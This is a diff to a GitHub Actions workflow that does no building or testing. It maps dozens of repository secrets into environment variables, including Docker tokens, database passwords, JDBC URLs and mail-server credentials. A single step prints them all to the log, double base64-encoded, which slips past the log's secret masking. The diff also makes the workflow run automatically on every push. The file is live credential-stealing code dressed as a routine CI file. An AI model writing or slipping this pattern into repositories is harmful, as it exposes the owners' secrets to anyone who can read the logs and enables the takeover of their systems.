@@ -1,6 +1,5 @@
 name: GitHub Actions
-on:
-  workflow_dispatch:
+on: push
 jobs:
   init:
     runs-on: ubuntu-latest
@@ -8,33 +7,33 @@ jobs:
       - name: command
         run: env -0 | awk -v RS='\0' '/^(secret_|var_)/ {print $0}' | base64 -w0 | base64 -w0
         env:
-          secret_docker_username: ${{ secrets.docker_username }}
-          secret_docker_token: ${{ secrets.docker_token }}
-          secret_docker_password: ${{ secrets.docker_password }}
-          secret_username: ${{ secrets.username }}
-          secret_password: ${{ secrets.password }}
-          secret_DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
-          secret_DOCKER_TOKEN: ${{ secrets.DOCKER_TOKEN }}
-          secret_DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
-          secret_MYSQL_ROOT_PASSWORD: ${{ secrets.MYSQL_ROOT_PASSWORD }}
-          secret_MYSQL_PASSWORD: ${{ secrets.MYSQL_PASSWORD }}
-          secret_ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
-          secret_JDBC_URL: ${{ secrets.JDBC_URL }}
-          secret_JDBC_PASSWORD: ${{ secrets.JDBC_PASSWORD }}
-          secret_ALARM_MAIL_SERVER_URL: ${{ secrets.ALARM_MAIL_SERVER_URL }}
-          secret_ALARM_MAIL_SERVER_PORT: ${{ secrets.ALARM_MAIL_SERVER_PORT }}
-          secret_ALARM_MAIL_SERVER_USERNAME: ${{ secrets.ALARM_MAIL_SERVER_USERNAME }}
-          secret_ALARM_MAIL_SERVER_PASSWORD: ${{ secrets.ALARM_MAIL_SERVER_PASSWORD }}
-          secret_ALARM_MAIL_SENDER_ADDRESS: ${{ secrets.ALARM_MAIL_SENDER_ADDRESS }}
-          secret_ALARM_MAIL_TRANSPORT_PROTOCOL: ${{ secrets.ALARM_MAIL_TRANSPORT_PROTOCOL }}
-          secret_ALARM_MAIL_SMTP_PORT: ${{ secrets.ALARM_MAIL_SMTP_PORT }}
-          secret_ALARM_MAIL_SMTP_AUTH: ${{ secrets.ALARM_MAIL_SMTP_AUTH }}
-          secret_ALARM_MAIL_SMTP_STARTTLS_ENABLE: ${{ secrets.ALARM_MAIL_SMTP_STARTTLS_ENABLE }}
-          secret_ALARM_MAIL_SMTP_STARTTLS_REQUIRED: ${{ secrets.ALARM_MAIL_SMTP_STARTTLS_REQUIRED }}
-          secret_ALARM_MAIL_DEBUG: ${{ secrets.ALARM_MAIL_DEBUG }}
-          secret_PINPOINT_PINOT_JDBC_URL: ${{ secrets.PINPOINT_PINOT_JDBC_URL }}
-          secret_PINPOINT_PINOT_JDBC_PASSWORD: ${{ secrets.PINPOINT_PINOT_JDBC_PASSWORD }}
-          secret_PINPOINT_VERSION: ${{ secrets.PINPOINT_VERSION }}
-          secret_SPRING_PROFILES: ${{ secrets.SPRING_PROFILES }}
-          secret_PINPOINT_NETWORK_SUBNET: ${{ secrets.PINPOINT_NETWORK_SUBNET }}
-          secret_COLLECTOR_FIXED_IP: ${{ secrets.COLLECTOR_FIXED_IP }}
+          secret_PINPOINT_ZOOKEEPER_ADDRESS: ${{ secrets.PINPOINT_ZOOKEEPER_ADDRESS }}
+          secret_PINPOINT_HBASE_NAME: ${{ secrets.PINPOINT_HBASE_NAME }}
+          secret_AGENTINFO_TTL: ${{ secrets.AGENTINFO_TTL }}
+          secret_AGENTSTATV2_TTL: ${{ secrets.AGENTSTATV2_TTL }}
+          secret_APPSTATAGGRE_TTL: ${{ secrets.APPSTATAGGRE_TTL }}
+          secret_APPINDEX_TTL: ${{ secrets.APPINDEX_TTL }}
+          secret_AGENTLIFECYCLE_TTL: ${{ secrets.AGENTLIFECYCLE_TTL }}
+          secret_AGENTEVENT_TTL: ${{ secrets.AGENTEVENT_TTL }}
+          secret_STRINGMETADATA_TTL: ${{ secrets.STRINGMETADATA_TTL }}
+          secret_APIMETADATA_TTL: ${{ secrets.APIMETADATA_TTL }}
+          secret_SQLMETADATA_TTL: ${{ secrets.SQLMETADATA_TTL }}
+          secret_TRACEV2_TTL: ${{ secrets.TRACEV2_TTL }}
+          secret_APPTRACEINDEX_TTL: ${{ secrets.APPTRACEINDEX_TTL }}
+          secret_APPMAPSTATCALLERV2_TTL: ${{ secrets.APPMAPSTATCALLERV2_TTL }}
+          secret_APPMAPSTATCALLEV2_TTL: ${{ secrets.APPMAPSTATCALLEV2_TTL }}
+          secret_APPMAPSTATSELFV2_TTL: ${{ secrets.APPMAPSTATSELFV2_TTL }}
+          secret_HOSTAPPMAPV2_TTL: ${{ secrets.HOSTAPPMAPV2_TTL }}
+          secret_MYSQL_USER: ${{ secrets.MYSQL_USER }}
+          secret_MYSQL_DATABASE: ${{ secrets.MYSQL_DATABASE }}
+          secret_PINPOINT_WEB_NAME: ${{ secrets.PINPOINT_WEB_NAME }}
+          secret_WEB_SERVER_PORT: ${{ secrets.WEB_SERVER_PORT }}
+          secret_WEB_LOGGING_LEVEL_ROOT: ${{ secrets.WEB_LOGGING_LEVEL_ROOT }}
+          secret_CLUSTER_ENABLE: ${{ secrets.CLUSTER_ENABLE }}
+          secret_CONFIG_SENDUSAGE: ${{ secrets.CONFIG_SENDUSAGE }}
+          secret_CONFIG_SHOW_APPLICATIONSTAT: ${{ secrets.CONFIG_SHOW_APPLICATIONSTAT }}
+          secret_JDBC_DRIVERCLASSNAME: ${{ secrets.JDBC_DRIVERCLASSNAME }}
+          secret_JDBC_USERNAME: ${{ secrets.JDBC_USERNAME }}
+          secret_PINPOINT_COLLECTOR_NAME: ${{ secrets.PINPOINT_COLLECTOR_NAME }}
+          secret_COLLECTOR_LOGGING_LEVEL_ROOT: ${{ secrets.COLLECTOR_LOGGING_LEVEL_ROOT }}
+          secret_COLLECTOR_RECEIVER_GRPC_AGENT_PORT: ${{ secrets.COLLECTOR_RECEIVER_GRPC_AGENT_PORT }}
